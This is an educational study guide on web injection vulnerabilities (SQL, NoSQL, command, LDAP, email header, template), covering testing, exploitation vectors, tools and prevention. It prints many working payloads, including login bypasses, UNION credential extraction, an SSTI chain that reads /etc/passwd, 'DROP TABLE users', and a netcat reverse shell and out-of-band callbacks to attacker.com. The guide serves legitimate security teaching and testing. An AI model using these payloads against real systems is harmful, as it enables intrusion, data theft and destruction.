## 🛡️: Injection

🔹 **Types**
- **SQL Injection (Classic, Boolean, Time-based)**
- **NoSQL Injection (MongoDB, Cassandra)**
- **Command Injection (OS, Shell)**
- **LDAP Injection**
- **ORM Injection (HQL, JPA)**
- **XML/XPath Injection**
- **Email Header Injection (SMTP)**
- **Host Header Injection**
- **Expression Language Injection (EL, JSTL)**
- **Template Injection (SSTI – Server-Side Template Injection)**

🔹 **Real-World Scenarios**
- **SQLi → Data Breach of Millions of User Records**
- **Command Injection → Full Server Takeover**
- **NoSQL Injection → Bypass Authentication, Extract All Documents**
- **LDAP Injection → Enumerate Directory, Bypass Login**
- **SSTI → Remote Code Execution (RCE) via Template Engines**
- **Email Injection → Spam, Phishing, Internal Mail Relay Abuse**

🔹 **Testing Techniques**
- **Manual Payload Injection (Parameter Fuzzing)**
- **Time-Based Delays (e.g., `WAITFOR DELAY`, `pg_sleep`)**
- **Boolean Inference (Blind SQLi)**
- **Out-of-Band (OAST) via DNS/HTTP (e.g., `xp_dirtree`, `UTL_HTTP`)**
- **Automated Scanning (sqlmap, NoSQLMap)**
- **Code Review for Unsanitized Input in System Calls / Queries**
- **Fuzzing Special Characters (`'`, `"`, `;`, `|`, `&`, `$`, `` ` ``, `\`, `\n`)**

🔹 **Exploitation Vectors**
- **User Input Fields (Login, Search, Feedback, Contact Forms)**
- **HTTP Headers (User-Agent, Referer, X-Forwarded-For, Cookie)**
- **URL Parameters (GET, POST, PUT, DELETE)**
- **File Uploads (Filename injection in OS commands)**
- **JSON/XML API Payloads**
- **Hidden Form Fields & Client-Side Data**

🔹 **Prevention**
- **Parameterized Queries (Prepared Statements)**
- **Stored Procedures (with proper input sanitization)**
- **Input Validation & Output Encoding**
- **Principle of Least Privilege for DB/OS**
- **Allow Listing of Commands/Characters**
- **Use Secure APIs (ORM, Safe Query Builders)**
- **Web Application Firewall (WAF) but not sole reliance**

🔹 **Tools**
- **sqlmap (automated SQLi exploitation)**
- **NoSQLMap / Mongo-Exploit**
- **Commix (command injection)**
- **Burp Suite (Intruder, Repeater, Scanner)**
- **FFUF / WFuzz**
- **SQLninja, Havij, jSQL**
- **Custom Python/Go Scripts**

🔹 **Checklist ✅**
- **Can you break the query by injecting a single quote (`'`)?**
- **Does the application respond differently to `'` and `\'`?**
- **Can you induce a time delay (e.g., `' WAITFOR DELAY '0:0:5' --`)?**
- **Can you retrieve data via Boolean inference (e.g., `' AND '1'='1` vs `' AND '1'='2`)?**
- **Are there error messages revealing SQL syntax or stack traces?**
- **Can you execute OS commands via `;`, `|`, `&`, `$()`?**
- **Can you inject LDAP filters (`*`, `|`, `&`, `!`)?**
- **Can you manipulate JSON/NoSQL operators (`$ne`, `$gt`, `$regex`)?**

🔐 **Chapter 1: Injection – Deep Dive**

🚨 **What is Injection?**
Injection flaws occur when untrusted data is sent to an interpreter as part of a command or query. The attacker's hostile data tricks the interpreter into executing unintended commands or accessing data without proper authorization. Injection is the most prevalent and critical web vulnerability class.

🧠 **Why Is It Critical?**
- **OWASP Top 10 #1 (2017) & #3 (2021)**: Consistently among the highest risk categories.
- **Impact**: Data loss, corruption, full system compromise, authentication bypass, lateral movement.
- **Prevalence**: Found in almost every legacy and modern stack (SQL, NoSQL, LDAP, OS, XML, etc.).

🔄 **Real-World Examples**
| Case | Description |
|------|-------------|
| ✅ SQL Injection | `' OR '1'='1` bypasses login, dumps entire user table via UNION. |
| ✅ Command Injection | `; cat /etc/passwd` appended to a ping parameter. |
| ✅ NoSQL Injection | `{"username": {"$ne": null}, "password": {"$ne": null}}` logs in without credentials. |
| ✅ LDAP Injection | `*)(uid=*` returns all directory entries, bypassing authentication. |
| ✅ SSTI | `{{7*7}}` evaluated to `49` reveals template engine injection → RCE. |

🔍 **Attack Surface Overview**
| Category | Targets |
|----------|---------|
| SQL | Login, search, sort, filters, parameters |
| NoSQL | JSON/XML APIs, MongoDB operators |
| Command | Ping, traceroute, file conversion, system utilities |
| LDAP | Authentication, user search, group membership |
| Templating | Jinja2, Twig, Freemarker, Velocity, Thymeleaf |
| Email | Contact forms, newsletter signup, feedback |

🧪 **How Do You Test for It?**

**1. 🔁 Manual Probe**
- **Start simple**: Submit a single quote (`'`) and observe errors.
- **Boolean test**: `' AND '1'='1` vs `' AND '1'='2`.
- **Time-based**: `' WAITFOR DELAY '0:0:10' --` (SQL Server), `' AND SLEEP(10) --` (MySQL).

**2. 🛠️ Automated Tools**
- Use **sqlmap** for full SQLi detection and exploitation.
- Use **NoSQLMap** for MongoDB injection.
- Use **Commix** for command injection.

**3. 🔌 Out-of-Bound Testing**
- For blind injection, use `LOAD_FILE`, `xp_cmdshell`, `UTL_HTTP`, or DNS exfiltration.

**🛡️ Prevention Techniques (For Developers)**
| Strategy | Description |
|----------|-------------|
| ✅ Parameterized Queries | Separate SQL code from data (Prepared Statements). |
| ✅ Input Validation | Allow list expected characters, reject dangerous ones. |
| ✅ Escaping | Escape special characters for the target interpreter. |
| ✅ Least Privilege | DB user should have minimal needed rights. |
| ✅ Secure APIs | Use ORM with safe query building (avoid raw SQL). |
| ✅ WAF/ RASP | Additional layer, but not a primary defense. |

📋 **Basic Checklist ✅**
| Check | Status |
|-------|--------|
| Does `'` cause an error? | ❌ |
| Can you change the logic (`' OR 1=1 --`)? | ❌ |
| Can you union data from other tables? | ❌ |
| Can you inject OS commands? | ❌ |
| Are error messages suppressed? | ✅ |
| Are prepared statements used? | ✅ |

💡 **Pro Tips**
- Always test all input vectors: GET, POST, cookies, headers, JSON/XML.
- Blind injection requires patience – use time or boolean differentiation.
- Out-of-band techniques are best for data extraction when no direct output.
- Combine injection with other vulnerabilities (e.g., XXE, SSRF) for greater impact.

🧠 **Real Pentester Mindset**
- "What if I add a quote? Does the app crash?"
- "Can I change the logical condition of a WHERE clause?"
- "Can I append a second query?"
- "Does the backend use string concatenation for commands?"

🧩 **Chapter 2: Types of Injection — In-Depth**

**1️⃣ SQL Injection**
- **Description**: Attacker inserts malicious SQL code into a query, manipulating database operations.
- **Subtypes**:
    - **Classic (Error-based)**: Errors reveal structure → `' UNION SELECT @@version --`
    - **Boolean Blind**: Different responses for true/false conditions.
    - **Time-based Blind**: Delays indicate truth.
    - **Out-of-Band**: DNS/HTTP exfiltration (e.g., `xp_dirtree`).
- **Impact**: Data theft, authentication bypass, data modification, RCE (via `xp_cmdshell`).

**2️⃣ NoSQL Injection**
- **Description**: Attackers inject into NoSQL databases (MongoDB, Cassandra) using operators or JavaScript.
- **Examples**:
    - `{"username": {"$ne": null}, "password": {"$ne": null}}` → bypass login.
    - `$where: "this.password.match(/.*/)"` → extract data.
- **Testing**: Inject JSON operators (`$gt`, `$regex`, `$where`).

**3️⃣ Command Injection**
- **Description**: Arbitrary OS commands executed via unsanitized user input passed to `system()`, `exec()`, `eval()`.
- **Vectors**: `;`, `|`, `&`, `$()`, `` ` ``, `\n`, `%0a`.
- **Impact**: Full system compromise, reverse shell, data exfiltration.

**4️⃣ LDAP Injection**
- **Description**: Manipulates LDAP filters to bypass authentication or retrieve directory data.
- **Example**: `*)(uid=*` → returns all entries.
- **Impact**: Enumerate users, escalate privileges, bypass access controls.

**5️⃣ ORM Injection (HQL, JPA)**
- **Description**: Object-Relational Mapping frameworks may still be vulnerable if raw queries or unvalidated parameters are used.
- **Example**: HQL injection via `from User where name = '" + input + "'"`.

**6️⃣ XML/XPath Injection**
- **Description**: Inject into XPath queries used for XML document navigation.
- **Impact**: Bypass authentication, extract XML data, modify documents.

**7️⃣ Email Header Injection**
- **Description**: Inject newlines (`\r\n`) into email headers to add BCC, CC, or change subject/body.
- **Example**: `email=attacker@example.com%0aBCC: victim@example.com`.
- **Impact**: Spam, phishing, internal mail relay.

**8️⃣ Host Header Injection**
- **Description**: Manipulate the `Host` header to cause password reset poisoning, cache poisoning, or SSRF.
- **Impact**: Account takeover, web cache deception.

**9️⃣ Expression Language (EL) Injection**
- **Description**: Inject into EL expressions (e.g., `${7*7}`) in Java-based apps.
- **Impact**: Information disclosure, RCE if combined with `Runtime.exec()`.

**🔟 Server-Side Template Injection (SSTI)**
- **Description**: Inject into template engines (Jinja2, Twig, Freemarker).
- **Example**: `{{7*7}}` → `49` reveals vulnerability.
- **Impact**: RCE, data leakage, full server compromise.

✅ **Summary Table**
| Type | Attack Vector | Detection | Impact |
|------|---------------|-----------|--------|
| SQLi | `'`, `"`, `;` | Error, time, boolean | High to Critical |
| NoSQLi | `$ne`, `$gt`, `$regex` | Auth bypass, data dump | High |
| Command Injection | `;`, `|`, `&`, `` ` `` | Response contains command output | Critical |
| LDAP | `*`, `|`, `&` | Auth bypass, directory listing | High |
| SSTI | `{{7*7}}`, `${7*7}` | Math evaluation, RCE | Critical |

✅ **Chapter 3: Real-World Scenarios (Injection)**

**🧩 1. SQL Injection → Mass Data Breach**
- **Scenario**: A search endpoint concatenates user input: `SELECT * FROM products WHERE name LIKE '%" + input + "%'`.
- **Attack**: `' UNION SELECT username, password FROM users -- `
- **Impact**: Entire user credential database leaked.

**🗑️ 2. Command Injection → Reverse Shell**
- **Scenario**: Ping utility: `ping -c 4 " + userIP`.
- **Attack**: `8.8.8.8; nc -e /bin/sh attacker.com 4444`.
- **Impact**: Remote code execution, full server takeover.

**👁️‍🗨️ 3. NoSQL Injection → Admin Bypass**
- **Scenario**: MongoDB login: `db.users.find({username: user, password: pass})`.
- **Attack**: JSON payload `{"username": {"$ne": null}, "password": {"$ne": null}}`.
- **Impact**: Login as any user without credentials.

**📧 4. Email Header Injection → Phishing**
- **Scenario**: Contact form sends email: `mail($to, $subject, $body, $headers)`.
- **Attack**: `attacker@example.com%0aBCC: victims@example.com`.
- **Impact**: Abuse mail server for spam/phishing.

**🎨 5. SSTI → Remote Code Execution**
- **Scenario**: Jinja2 template: `Hello {{ user.name }}`.
- **Attack**: `{{ config.__class__.__init__.__globals__['os'].popen('id').read() }}`.
- **Impact**: Execute system commands, read files.

**🔐 General Recommendations:**
| Mistake | Consequence | Fix |
|---------|-------------|-----|
| String concatenation in SQL | SQLi → data breach | Parameterized queries |
| Passing user input to system() | Command injection → RCE | Input validation + allow list |
| Trusting JSON operators | NoSQL injection → auth bypass | Validate data types, use safe query builders |
| Allowing template evaluation | SSTI → RCE | Sandbox templates, avoid user input in templates |

🔍 **Chapter 4: Testing Techniques – Injection**

**1. 🔧 Manual SQL Injection Testing**
- **Error detection**: `'`, `"`, `\`, `%27`.
- **Boolean differentiation**: `' AND '1'='1` (normal) vs `' AND '1'='2` (different).
- **Union attacks**: `' UNION SELECT null, @@version --`.
- **Time-based**: `' AND SLEEP(5) --` (MySQL), `' WAITFOR DELAY '0:0:5' --` (MSSQL).
- **Out-of-band**: `' AND 1=1; exec xp_dirtree '\\attacker.com\share' --`.

**2. 🐚 Command Injection Testing**
- **Basic payloads**: `; id`, `| id`, `& id`, `$(id)`, `` `id` ``.
- **Blind command injection**: `sleep 5`, `ping -c 5 attacker.com`, `nslookup attacker.com`.
- **Encoding bypass**: `%0aid`, `%0a%0aid`, `%26id`.
- **Tools**: Commix, Burp Intruder with command injection wordlist.

**3. 📦 NoSQL Injection Testing**
- **MongoDB operators**: `$ne`, `$gt`, `$lt`, `$regex`, `$where`.
- **JSON injection**: `{"username": {"$ne": null}}`.
- **URL parameter injection**: `?username[$ne]=null&password[$ne]=null`.
- **Tools**: NoSQLMap, Burp with custom JSON payloads.

**4. 🧬 LDAP Injection Testing**
- **Basic payload**: `*)(uid=*`.
- **Authentication bypass**: `*)(|(uid=*`.
- **Blind LDAP**: `(&(uid=admin)(userPassword=*))` – test with timing differences.

**5. 🧠 SSTI Testing**
- **Identify engine**: `{{7*7}}` (Jinja2, Twig), `${7*7}` (Freemarker), `#{7*7}` (Thymeleaf).
- **Payload progression**: `{{config}}`, `{{self.__class__.__mro__}}`, `{{''.__class__.__mro__[2].__subclasses__()}}`.
- **Tools**: Tplmap, Burp Intruder.

**✅ Quick Tester's Workflow**
1. **Fuzz all inputs** with special characters (`'`, `"`, `;`, `|`, `&`, `$`, `` ` ``, `\n`).
2. **Observe anomalies**: errors, time differences, output changes.
3. **Confirm injection** with benign payloads (`' AND 1=1 --`).
4. **Extract data** using UNION or Boolean inference.
5. **Escalate** to OS commands or RCE.

🧪 **Pro Tip**: Always test both authenticated and unauthenticated states. WAFs may block simple payloads – try encoding, case variation, and comment obfuscation.

✅ **Chapter 5: Exploitation Vectors – Injection**

**🔹 1. SQL Injection Vectors**
- **Login forms**: `' OR '1'='1' --` bypass.
- **Search bars**: `' UNION SELECT username, password FROM users --`.
- **Order by / Sorting**: `?sort=(CASE WHEN (user=admin) THEN id ELSE name END)`.
- **HTTP Headers**: `User-Agent: ' OR 1=1 --`.
- **Cookies**: `Cookie: tracking_id=' UNION SELECT @@version --`.

**🔹 2. Command Injection Vectors**
- **Ping / Traceroute**: `?ip=8.8.8.8; whoami`.
- **File uploads**: Filename `test; id .txt`.
- **Image processing**: `convert input.jpg -resize 100x100 output.jpg` → inject in filename.
- **System utilities**: `?host=localhost%0aid`.

**🔹 3. NoSQL Injection Vectors**
- **JSON APIs**: `{"username": {"$ne": ""}, "password": {"$ne": ""}}`.
- **URL parameters**: `?search[$regex]=.*&search[$options]=i`.
- **Login endpoints**: `?username[$ne]=null&password[$ne]=null`.

**🔹 4. LDAP Injection Vectors**
- **Authentication filters**: `(|(uid=admin)(cn=*))`.
- **User search**: `*)(objectClass=*)`.

**🔹 5. SSTI Vectors**
- **URL parameters**: `?name={{7*7}}`.
- **POST data**: `{"template": "Hello {{7*7}}"}`.
- **File uploads**: Template files with injected expressions.

**📌 Exploitation-Oriented Checklist**
| Checkpoint | ✅ |
|------------|----|
| Can you cause an SQL error? | ⬜ |
| Can you bypass login with `' OR 1=1 --`? | ⬜ |
| Can you execute `sleep(5)` via command injection? | ⬜ |
| Can you extract MongoDB data using `$ne`? | ⬜ |
| Can you get `{{7*7}}` to evaluate as `49`? | ⬜ |
| Can you inject email headers with `%0a`? | ⬜ |

✅ **Chapter 6: Prevention of Injection**

**🔒 1. Parameterized Queries (Prepared Statements)**
- **What it is**: SQL code and data are separated. Placeholders (`?` or `:name`) are used for data.
- **Example (Java)**: `PreparedStatement stmt = conn.prepareStatement("SELECT * FROM users WHERE id = ?"); stmt.setInt(1, userId);`.
- **Why it works**: Data is never interpreted as SQL code.

**🔑 2. Input Validation**
- **What it is**: Reject or sanitize input based on an allow list of expected characters.
- **Example**: For a user ID, allow only digits `0-9`.
- **Important**: Validation is defense-in-depth, not a primary defense.

**🛡️ 3. Escaping Special Characters**
- **What it is**: Escape characters that have special meaning in the target interpreter.
- **Use case**: When parameterized queries are impossible (e.g., table/column names dynamic).
- **Risk**: Incomplete escaping can still lead to injection.

**🔐 4. Least Privilege Database Accounts**
- **What it is**: The application database user should have only the necessary permissions (SELECT, INSERT, UPDATE, DELETE on specific tables, never DROP or ADMIN).
- **Why**: Limits damage even if injection occurs.

**🔀 5. Use Secure APIs & ORMs**
- **What it is**: Use Object-Relational Mapping (ORM) libraries that build queries safely.
- **Example**: Hibernate, Entity Framework, SQLAlchemy.
- **Caveat**: Even ORMs can be vulnerable if raw SQL or unsafe concatenation is used.

**🧾 6. Web Application Firewall (WAF)**
- **What it is**: Filters malicious requests based on signatures.
- **Limitation**: Can be bypassed; should not be the only defense.

**📋 Summary Checklist for Prevention ✅**
| Area | Check |
|------|-------|
| Parameterized queries | ✅ All SQL queries use placeholders |
| Input validation | ✅ Allow list enforced on all inputs |
| Escaping | ✅ Used only where necessary and correctly |
| Least privilege | ✅ DB user has minimal rights |
| Secure APIs | ✅ ORM used without raw SQL |
| WAF | ✅ Additional layer present |
| Code reviews | ✅ Automated and manual checks for injection patterns |

🔧 **Chapter 7: Tools – Deep Dive for Injection**

**🔹 1. sqlmap**
- **Purpose**: Automatic SQL injection detection and exploitation.
- **Features**:
    - Supports all major DBMS (MySQL, MSSQL, Oracle, PostgreSQL).
    - Boolean, time-based, error-based, UNION, out-of-band.
    - Dump tables, read files, execute commands (--os-shell).
    - Tamper scripts to bypass WAFs.
- **Basic usage**: `sqlmap -u "http://target.com/page?id=1" --dbs`.

**🔹 2. NoSQLMap / Mongo-Exploit**
- **Purpose**: NoSQL injection for MongoDB, CouchDB, etc.
- **Features**:
    - Authentication bypass.
    - Data extraction.
    - JavaScript injection.
- **Usage**: `python nosqlmap.py --url http://target.com/login --auth`.

**🔹 3. Commix**
- **Purpose**: Automated command injection detection and exploitation.
- **Features**:
    - Supports `;`, `|`, `&`, `` ` ``, `$()` injection.
    - Blind command injection (time-based).
    - Reverse shell, file upload/download.
- **Usage**: `commix --url "http://target.com/ping?ip=8.8.8.8" --data "ip=INJECT_HERE"`.

**🔹 4. Burp Suite**
- **Purpose**: Manual and automated injection testing.
- **Key features**:
    - **Intruder**: Fuzz parameters with injection payloads.
    - **Repeater**: Manual testing and verification.
    - **Scanner**: Automated detection (Pro version).
    - **Extensions**: SQLiPy, J2EEScan, etc.

**🔹 5. FFUF / WFuzz**
- **Purpose**: Fuzzing for injection points.
- **Usage**: `ffuf -u "http://target.com/search?q=FUZZ" -w payloads.txt -mc all`.

**🔹 6. Tplmap**
- **Purpose**: Server-Side Template Injection exploitation.
- **Usage**: `tplmap -u "http://target.com/page?name={{7*7}}"`.

**🔹 7. Custom Python/Go Scripts**
- **Purpose**: Automate blind injection or bypass specific filters.
- **Example**: Boolean-based SQLi script that iterates over characters.

**🧪 Pro Tip**: Combine tools – use ffuf for discovery, Burp for manual verification, and sqlmap/commix for exploitation.

✅ **Chapter 8: Injection Checklist (Deep Dive)**

**🔍 1. SQL Injection**
- [ ] Submit a single quote (`'`) – does it cause an error?
- [ ] Submit `' OR '1'='1` – does it return more results?
- [ ] Submit `' AND SLEEP(5) --` – is there a delay?
- [ ] Submit `' UNION SELECT @@version, null --` – does version appear?
- [ ] Try stacked queries: `'; DROP TABLE users --` (check if multiple statements allowed).
- [ ] Test all parameters: GET, POST, Cookie, User-Agent, Referer, X-Forwarded-For.

**🛠 2. NoSQL Injection**
- [ ] Inject `{"$ne": null}` into JSON fields – does it bypass login?
- [ ] Try `$regex` to extract data: `{"username": {"$regex": "^admin"}}`.
- [ ] Use `$where` with JavaScript: `{"$where": "this.password.length > 0"}`.
- [ ] Test URL-encoded operators: `?username[$ne]=null`.

**🌀 3. Command Injection**
- [ ] Append `; id` to any parameter that executes system commands.
- [ ] Try `| id`, `& id`, `$(id)`, `` `id` ``.
- [ ] Test time-based: `; sleep 5` – does response take longer?
- [ ] Use out-of-band: `; nslookup attacker.com`.
- [ ] Bypass with encoding: `%0aid`, `%0a%0aid`.

**📁 4. LDAP Injection**
- [ ] Inject `*` in username field – does it return all users?
- [ ] Use `*)(uid=*` to bypass authentication.
- [ ] Try `(|(uid=*)(cn=*))`.

**🔌 5. SSTI (Server-Side Template Injection)**
- [ ] Inject `{{7*7}}` – does it evaluate to `49`?
- [ ] Try `${7*7}`, `#{7*7}`, `{{7*'7'}}`.
- [ ] Escalate: `{{config}}`, `{{self.__class__.__mro__}}`.
- [ ] Check for RCE: `{{''.__class__.__mro__[2].__subclasses__()[40]('/etc/passwd').read()}}`.

**📧 6. Email Header Injection**
- [ ] Inject newline: `attacker@example.com%0aBCC: victim@example.com`.
- [ ] Try `%0d%0a` for CRLF.
- [ ] Add custom headers: `%0aSubject: Spam%0aX-Mailer: Test`.

**📋 7. General Injection Points**
- [ ] Test file uploads – filename with injection.
- [ ] Test XML/JSON APIs – inject into values.
- [ ] Test hidden form fields – modify via browser dev tools.
- [ ] Test WebSocket messages.

**🔧 Pro Tip**: Automate where possible, but always manually verify. Use multiple encoding techniques (URL, HTML, Unicode, double URL) to bypass filters.

🧠 **Injection – Advanced Mind Map (Text Format)**

**🧩 1. Introduction to Injection**
- 🔐 Definition: Interpreter receives hostile data → unintended commands.
- 🧨 OWASP Rank: #1 historically, now #3 but still critical.
- 🔍 Impact: Data breach, RCE, system compromise.

**🧪 2. Types of Injection**
- 🗄️ **SQL Injection**
    - Classic (error), Boolean blind, time-based, out-of-band
- 📦 **NoSQL Injection**
    - MongoDB operators (`$ne`, `$gt`, `$regex`, `$where`)
- 💻 **Command Injection**
    - `;`, `|`, `&`, `$()`, `` ` ``
- 📁 **LDAP Injection**
    - `*`, `|`, `&`, `!`
- 🧬 **ORM Injection** (HQL, JPA)
- 📄 **XML/XPath Injection**
- ✉️ **Email Header Injection**
    - `%0a`, `%0d%0a`
- 🎯 **Host Header Injection**
- 🧠 **SSTI** (Jinja2, Twig, Freemarker)
- 🔣 **EL Injection**

**🎯 3. Real-World Scenarios**
- 🗄️ SQLi → mass data breach (millions of records)
- 💻 Command injection → reverse shell → full takeover
- 📦 NoSQL injection → admin bypass
- ✉️ Email injection → spam/phishing campaigns
- 🧠 SSTI → RCE via template engine

**🧪 4. Testing Techniques**
- 🔧 Manual probe (`'`, `;`, `$ne`)
- ⏱️ Time-based detection (`sleep`, `WAITFOR`)
- 🔁 Boolean inference (different responses)
- 📡 Out-of-band (DNS/HTTP exfiltration)
- 🤖 Automated tools (sqlmap, commix, NoSQLMap)
- 🧬 Fuzzing (Burp Intruder, ffuf)

**🚨 5. Exploitation Vectors**
- 📝 User input fields (login, search, forms)
- 🔌 HTTP headers (User-Agent, Cookie, X-Forwarded-For)
- 📦 JSON/XML API payloads
- 📂 File uploads (filename)
- 🔗 URL parameters (GET, POST, PUT, DELETE)

**🛡️ 6. Prevention**
- ✅ Parameterized queries (Prepared Statements)
- 🔑 Input validation (allow list)
- 🛡️ Escaping special characters
- 🔐 Least privilege principle
- 🔀 Secure APIs / ORMs
- 🧾 WAF (additional layer)
- 📋 Code reviews + SAST/DAST

**🔧 7. Tools**
- 🔍 sqlmap – automated SQLi
- 📦 NoSQLMap – NoSQL injection
- 💻 Commix – command injection
- 🧪 Burp Suite – manual + automated
- 🚀 FFUF / WFuzz – fuzzing
- 🧠 Tplmap – SSTI exploitation
- 🐍 Custom scripts – blind injection automation

**✅ 8. Checklist**
- ✅ Test single quote `'` for SQL error
- ✅ Test `' OR '1'='1` for auth bypass
- ✅ Test `; id` for command injection
- ✅ Test `$ne` for NoSQL bypass
- ✅ Test `{{7*7}}` for SSTI
- ✅ Test `%0aBCC:` for email injection
- ✅ Test all input vectors (headers, cookies, JSON)
- ✅ Use automated + manual verification
